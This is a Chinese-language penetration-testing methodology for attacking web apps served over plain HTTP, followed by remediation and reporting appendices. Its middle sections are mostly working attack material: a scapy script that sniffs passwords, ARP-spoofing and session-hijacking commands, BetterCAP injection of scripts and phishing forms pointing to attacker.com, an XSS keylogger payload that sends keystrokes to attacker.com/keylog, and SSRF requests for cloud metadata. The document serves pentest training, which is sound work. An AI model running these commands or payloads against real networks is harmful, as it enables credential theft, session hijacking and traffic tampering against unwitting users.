# HTTP-only 部署攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本方法论旨在为渗透测试人员提供针对 HTTP-only 部署（未启用 HTTPS/TLS）系统的标准化检测与利用流程。当应用系统仅通过 HTTP 明文传输所有数据时，攻击者可通过网络嗅探、中间人攻击等手段窃取敏感信息。本文档指导测试人员系统性地识别 HTTP-only 部署风险并进行合理利用。

### 1.2 适用范围
- **目标系统**: 仅启用 HTTP（端口 80）未配置 HTTPS 的 Web 应用
- **典型特征**: 无 TLS 证书、无 HTTPS 重定向、Cookie 缺少 Secure 标志
- **适用环境**: Web 应用渗透测试、内网渗透、CTF 挑战、红队演练
- **攻击场景**: 网络嗅探、会话劫持、凭证拦截、中间人攻击

### 1.3 读者对象
- 执行渗透测试的安全工程师
- 进行网络架构安全评估的安全分析师
- 负责 Web 应用安全的开发人员
- CTF 竞赛参与者

---

## 第二部分：核心渗透技术专题

### 专题：HTTP-only 部署攻击

#### 2.1 技术介绍

**漏洞本质**：
HTTP-only 部署是指应用程序仅通过 HTTP 协议（明文）提供服务，未配置 HTTPS/TLS 加密传输。这导致所有网络通信（包括认证凭证、会话 Cookie、敏感数据）都以明文形式传输，可被网络攻击者截获。

**OWASP 分类**：
- **OWASP Top 10:2025 A02:2025** - Cryptographic Failures
- **CWE-311** - Missing Encryption of Sensitive Data
- **CWE-319** - Cleartext Transmission of Sensitive Information

**风险场景**：
1. **同一网络攻击者**: 同一 WiFi 网络的攻击者可嗅探所有流量
2. **ISP 级别监听**: 网络服务提供商可记录所有 HTTP 请求
3. **路由器劫持**:  compromised 路由器可拦截和修改流量
4. **ARP 欺骗**: 内网 ARP spoofing 可重定向流量到攻击者

#### 2.2 HTTP-only 部署识别方法

##### 2.2.1 端口扫描检测

**Nmap 扫描**：
```bash
# 扫描 HTTP/HTTPS 端口
nmap -p 80,443,8080,8443 target.com

# 服务版本检测
nmap -sV -p 80,443 target.com

# SSL/TLS 检测
nmap --script ssl-enum-ciphers -p 443 target.com
```

**扫描结果解读**：
```
# 仅 HTTP 部署（存在风险）
80/tcp    open  http    Apache httpd
443/tcp   closed        # 443 关闭

# 正常部署
80/tcp    open  http    (redirects to HTTPS)
443/tcp   open  https   Apache httpd + SSL/TLS
```

##### 2.2.2 响应头分析

**HTTP 请求测试**：
```bash
# 测试 HTTP 到 HTTPS 重定向
curl -i http://target.com/

# 安全配置：应该 301/302 重定向到 HTTPS
HTTP/1.1 301 Moved Permanently
Location: https://target.com/

# 危险配置：直接返回内容
HTTP/1.1 200 OK
Content-Type: text/html
# 无重定向，直接返回页面内容
```

**检查 HSTS 头**：
```bash
curl -i https://target.com/ | grep -i "strict-transport-security"

# 安全配置：有 HSTS
Strict-Transport-Security: max-age=31536000; includeSubDomains

# 危险配置：无 HSTS
# 缺失 Strict-Transport-Security 头
```

##### 2.2.3 Cookie 安全标志检查

**Cookie 标志分析**：
```bash
# 检查 Set-Cookie 头
curl -i http://target.com/login | grep "Set-Cookie"

# 安全配置（HTTPS + Secure）
Set-Cookie: JSESSIONID=ABC123; Path=/; HttpOnly; Secure; SameSite=Strict

# 危险配置（HTTP-only 部署）
Set-Cookie: JSESSIONID=ABC123; Path=/; HttpOnly
# 缺失 Secure 标志
```

**Cookie 标志说明**：
| 标志 | 作用 | 缺失风险 |
|------|------|----------|
| Secure | 仅通过 HTTPS 传输 Cookie | Cookie 可通过 HTTP 截获 |
| HttpOnly | 禁止 JavaScript 访问 Cookie | XSS 可窃取 Cookie |
| SameSite | 限制跨站请求携带 Cookie | CSRF 攻击 |

#### 2.3 网络嗅探攻击

##### 2.3.1 被动嗅探

**Wireshark 抓包**：
```bash
# 启动 Wireshark 抓包
wireshark -i en0 -f "port 80"

# 过滤 HTTP 流量
http.request.method == "POST"

# 提取凭证
http.request.uri contains "login"
```

**tcpdump 命令行抓包**：
```bash
# 抓取 HTTP POST 请求
tcpdump -i en0 -s 0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# 保存抓包数据
tcpdump -i en0 -w capture.pcap port 80

# 分析抓包文件
tcpdump -r capture.pcap -A | grep -i "password\|cookie\|session"
```

##### 2.3.2 凭证提取

**从抓包提取登录凭证**：
```bash
# 使用 tshark 提取 POST 数据
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# 提取 Cookie
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# 提取用户名和密码
tshark -r capture.pcap -Y "http.request.method == POST" -T fields \
  -e http.request.full_uri \
  -e http.file_data
```

**Python 脚本自动化提取**：
```python
from scapy.all import *

def extract_credentials(pkt):
    if pkt.haslayer('Raw'):
        data = pkt['Raw'].load.decode('utf-8', errors='ignore')
        if 'password' in data.lower() or 'passwd' in data.lower():
            print(f"[+] Found credentials:\n{data}")

sniff(filter="tcp port 80", prn=extract_credentials, store=0)
```

#### 2.4 中间人攻击

##### 2.4.1 ARP 欺骗

**使用 BetterCAP 进行 ARP 欺骗**：
```bash
# 启动 BetterCAP
bettercap -iface en0

# BetterCAP 命令
set arp.spoof.targets 192.168.1.100  # 目标 IP
set arp.spoof.fullduplex true         # 全双工模式
arp.spoof on                          # 启用 ARP 欺骗
net.sniff on                          # 启用网络嗅探
```

**使用 Arpspoof**：
```bash
# 欺骗目标主机（让它认为你是网关）
arpspoof -i en0 -t 192.168.1.100 192.168.1.1

# 欺骗网关（让它认为你是目标）
arpspoof -i en0 -t 192.168.1.1 192.168.1.100

# 启用 IP 转发（保持目标网络连通）
echo 1 > /proc/sys/net/ipv4/ip_forward
```

##### 2.4.2 会话劫持

**Cookie 窃取流程**：
```
1. 攻击者通过 ARP 欺骗定位到目标流量
2. 嗅探 HTTP 请求中的 Set-Cookie 头
3. 提取 JSESSIONID 或其他会话 Cookie
4. 使用窃取的 Cookie 劫持会话
```

**会话劫持实战**：
```bash
# 步骤 1: 嗅探 Cookie
tshark -i en0 -Y "http.cookie" -T fields -e http.cookie > cookies.txt

# 步骤 2: 提取目标会话 Cookie
grep "JSESSIONID" cookies.txt | head -1 | cut -d';' -f1

# 步骤 3: 使用窃取的 Cookie
curl -H "Cookie: JSESSIONID=ABC123" http://target.com/dashboard
```

**Burp Suite 会话劫持**：
```
1. 在 Proxy 中捕获目标请求
2. 右键点击请求 → Copy to Session Handler
3. 在 Session Handler 中配置 Cookie 提取
4. 使用窃取的 Cookie 重放请求
```

##### 2.4.3 内容注入

**HTTP 响应注入**：
```bash
# 使用 BetterCAP 注入 JavaScript
set http.inject.content "<script src='http://attacker.com/malicious.js'></script>"
http.inject on

# 注入钓鱼表单
set http.inject.content "
<form action='http://attacker.com/steal' method='POST'>
    <input type='password' name='password' placeholder='重新输入密码'>
</form>
"
```

**图片替换攻击**：
```bash
# 替换页面中的图片为恶意内容
set http.replace.images "http://attacker.com/evil.png"
http.replace on
```

#### 2.5 组合攻击

##### 2.5.1 HTTP-only + XSS

**攻击链**：
```
1. 目标应用仅 HTTP 部署（无 HTTPS）
2. 存在 XSS 漏洞
3. 通过 XSS 注入键盘记录器
4. 通过 HTTP 明文传输窃取凭证
```

**组合 Payload**：
```html
<script>
    // 键盘记录
    document.addEventListener('keypress', function(e) {
        // 通过 HTTP 发送按键数据（无加密）
        new Image().src = 'http://attacker.com/keylog?key=' + 
            encodeURIComponent(String.fromCharCode(e.keyCode));
    });
</script>
```

##### 2.5.2 HTTP-only + 无认证系统

**攻击场景**：
```
1. 应用系统无认证机制
2. 所有功能通过 HTTP 暴露
3. 攻击者可直接访问所有端点
4. 敏感数据明文传输
```

**利用示例**：
```bash
# 直接访问管理端点
curl http://target.com/admin/users

# 提取所有用户数据（明文传输）
curl http://target.com/api/users | jq .

# 修改系统配置
curl -X POST http://target.com/admin/config \
  -d '{"admin_password": "new_password"}'
```

##### 2.5.3 HTTP-only + SSRF

**攻击链**：
```
1. 应用存在 SSRF 漏洞
2. 内部服务仅 HTTP 部署
3. 通过 SSRF 访问内部 HTTP 服务
4. 提取内部服务敏感数据
```

**利用示例**：
```bash
# 通过 SSRF 访问内部服务
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# 访问内部管理端点
curl "http://target.com/proxy?url=http://localhost:8080/admin"
```

---

## 第三部分：附录

### 3.1 HTTP-only 部署常见原因

| 原因 | 描述 | 典型场景 |
|------|------|----------|
| 开发环境配置 | 开发时未配置 HTTPS，误部署到生产 | 测试环境、Demo 系统 |
| 证书配置复杂 | SSL 证书申请和配置流程复杂 | 小型企业、个人项目 |
| 性能考虑 | 错误认为 HTTPS 影响性能 | 高流量网站（已过时观念） |
| 内部网络假设 | 认为内网不需要加密 | 企业内网应用 |
| 遗留系统 | 老旧系统升级困难 | 10 年以上老系统 |
| CTF 挑战 | 故意设计为 HTTP-only | 安全竞赛题目 |

### 3.2 修复建议

**立即措施**：
1. 在负载均衡器或反向代理层配置 HTTPS
2. 设置 HTTP 到 HTTPS 的强制重定向
3. 为所有 Cookie 添加 Secure 标志

**短期修复**：
1. 获取并安装有效的 SSL/TLS 证书（推荐 Let's Encrypt）
2. 配置 HSTS 响应头
3. 更新应用配置启用 HTTPS

**长期改进**：
1. 实施 TLS 1.3 和现代加密套件
2. 配置 Certificate Transparency 监控
3. 定期更新 SSL/TLS 配置

**推荐配置**：
```nginx
# Nginx HTTPS 配置示例
server {
    listen 443 ssl http2;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # 强制 HTTP 到 HTTPS 重定向
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

### 3.3 检测工具

**网络扫描工具**：
- **Nmap**: SSL/TLS 检测脚本
- **SSL Labs**: SSL 配置在线测试
- **testssl.sh**: 命令行 SSL 检测工具
- **Wireshark**: 网络协议分析

**testssl.sh 使用示例**：
```bash
# 完整 SSL 检测
./testssl.sh target.com

# 仅检测协议
./testssl.sh --protocols target.com

# 检测证书
./testssl.sh --certificate target.com
```

### 3.4 报告编写指南

**漏洞标题**：
```
高危：应用系统仅 HTTP 明文传输，缺少 HTTPS/TLS 加密保护
```

**漏洞描述**：
```
经检测，目标应用系统仅通过 HTTP 协议（端口 80）提供服务，
未配置 HTTPS/TLS 加密传输。所有网络通信（包括用户凭证、
会话 Cookie、敏感业务数据）均以明文形式传输，可被同一
网络的攻击者截获和篡改。
```

**影响评估**：
```
- 凭证窃取：登录凭证可被网络嗅探截获
- 会话劫持：会话 Cookie 可被窃取和重用
- 数据泄露：所有业务数据明文传输
- 内容篡改：中间人可修改响应内容
- 合规违规：违反 PCI DSS、GDPR 等加密要求
```

**修复建议**：
```
1. 立即获取并部署有效的 SSL/TLS 证书
2. 配置 HTTP 到 HTTPS 的强制重定向（301）
3. 启用 HSTS（Strict-Transport-Security）响应头
4. 为所有 Cookie 设置 Secure 标志
5. 禁用 TLS 1.0/1.1，使用 TLS 1.2/1.3
6. 配置强加密套件，禁用弱加密算法
```

---

**文档版本**: 1.0
**最后更新**: 2026 年 3 月
**参考来源**: OWASP 传输层保护指南、PCI DSS 加密要求、渗透测试实战案例
